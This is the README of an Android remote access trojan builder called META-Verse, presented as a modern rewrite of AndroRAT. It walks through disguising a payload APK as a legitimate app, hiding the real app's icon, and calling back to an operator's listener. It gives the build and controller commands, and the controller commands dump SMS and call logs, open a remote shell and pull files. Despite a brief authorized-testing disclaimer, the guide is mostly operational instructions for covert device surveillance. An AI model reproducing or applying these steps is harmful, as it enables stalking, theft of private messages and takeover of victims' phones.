# META-Verse

A modern rewrite of [AndroRAT](https://github.com/karma9874/AndroRAT) by karma9874, rebuilt from scratch to actually work on modern Android (tested up to Android 17). The original project stopped functioning reliably on newer Android releases due to major permission and API changes. Tested with Galaxy S25 Ultra.

It is not an exact clone of the original. META-Verse is designed for situations where the user intentionally installs and uses the payload APK on their own device or within an authorized testing environment.

What happens step by step
1. Decodes the target APK using apktool
2. Extracts the app name, icon, package name, and main activity from the manifest
3. Removes the LAUNCHER intent category from the target app so it no longer appears on the home screen after installation
4. Rebuilds and signs the modified target 
5. Copies the base payload smali, injects your IP/port, and patches it to launch the real app when opened
6. Replaces the payload icon and label with the ones extracted from the target app
7. Builds and signs the final payload as out/metavas_launcher.apk

> **For authorized security research and penetration testing on devices you own or have written permission to test. Don't be stupid with this.**

[![Stars](https://img.shields.io/github/stars/SameerAlSahab/META-Verse?style=for-the-badge&color=yellow)](https://github.com/SameerAlSahab/META-Verse/stargazers)
[![Forks](https://img.shields.io/github/forks/SameerAlSahab/META-Verse?style=for-the-badge&color=orange)](https://github.com/SameerAlSahab/META-Verse/network/members)
[![Issues](https://img.shields.io/github/issues/SameerAlSahab/META-Verse?style=for-the-badge&color=red)](https://github.com/SameerAlSahab/META-Verse/issues)
[![Pull Requests](https://img.shields.io/github/issues-pr/SameerAlSahab/META-Verse?style=for-the-badge&color=purple)](https://github.com/SameerAlSahab/META-Verse/pulls)
[![License](https://img.shields.io/github/license/SameerAlSahab/META-Verse?style=for-the-badge&color=blue)](LICENSE)
[![Last Commit](https://img.shields.io/github/last-commit/SameerAlSahab/META-Verse?style=for-the-badge&color=brightgreen)](https://github.com/SameerAlSahab/META-Verse/commits)
[![Repo Size](https://img.shields.io/github/repo-size/SameerAlSahab/META-Verse?style=for-the-badge&color=informational)](https://github.com/SameerAlSahab/META-Verse)
[![Contributors](https://img.shields.io/github/contributors/SameerAlSahab/META-Verse?style=for-the-badge&color=pink)](https://github.com/SameerAlSahab/META-Verse/graphs/contributors)

---


## Requirements
- Linux (tested on Ubuntu/Arch Linux and other linux distros)
- Java 11+
- `aapt2` (from Android build tools)
- Python 3.8+ (for the controller)

---


## Building the payload

```bash
bash metavas.sh -i <YOUR_IP> -p <PORT> -t <path/to/target.apk>
```

Example:

```bash
bash metavas.sh -i 192.168.1.10 -p 4444 -t ~/Downloads/someapp.apk
```

You end up with two APKs in `out/`:

| File | What it is |
|---|---|
| `<pkg>_hidden.apk` | The real app, with its launcher icon removed |
| `metavas_launcher.apk` | The payload, wearing the real app's identity |

Install both on the device. The payload opens, silently launches the hidden real app, and calls back to your listener.

---

## Running the controller

Usage 

```bash
pip install -r requirements.txt

python3 control.py -i <YOUR_IP> -p <PORT>
```

Start the listener before or after the device connects — it will wait.

```bash
python3 control.py -i 0.0.0.0 -p 4444
```

Bind to a specific interface instead of all:

```bash
python3 control.py -i 192.168.1.10 -p 4444
```

Once the device connects you get a prompt:

```
METAVERSE:/> 
```

### Available commands

| Command | What it does |
|---|---|
| `deviceInfo` | Basic device info (model, Android version, etc.) |
| `getSMS inbox` | Dumps inbox SMS to a timestamped file in `Dumps/` |
| `getSMS sent` | Same for sent messages |
| `vibrate [number]` | Vibrates the device given times |
| `getCallLogs` | Dumps call history to `Dumps/` |
| `getIP` | Returns the device's IP address |
| `shell` | Drops into an interactive shell on the device |
| `help` | Shows the command list |
| `clear` | Clears your terminal |
| `exit` | Closes the connection |

Inside `shell` you get a proper interactive prompt (`android@shell:~$`). You can also push and pull files:

```
android@shell:~$ pull /sdcard/somefile.txt   # downloads to Dumps/
android@shell:~$ push localfile.txt          # uploads to /sdcard/temp/
```

All dumped files go into a `Dumps/` folder in the directory you ran `control.py` from, named by type and timestamp.

---

## Licensing
This project is licensed under the terms of the [GNU General Public License v3.0](LICENSE). External dependencies might be distributed under a different license, such as:
- [apktool](https://github.com/iBotPeaches/Apktool), licensed under the [Apache License 2.0](https://github.com/iBotPeaches/Apktool/blob/master/LICENSE.md)
- [platform_build](https://android.googlesource.com/platform/build/) (signapk), licensed under the [Apache License 2.0](https://source.android.com/docs/setup/about/licenses)

## Credits

- Original Payload APK — [karma9874](https://github.com/karma9874/AndroRAT)
- META-Verse and initial ideas — Sameer Al Sahab

---

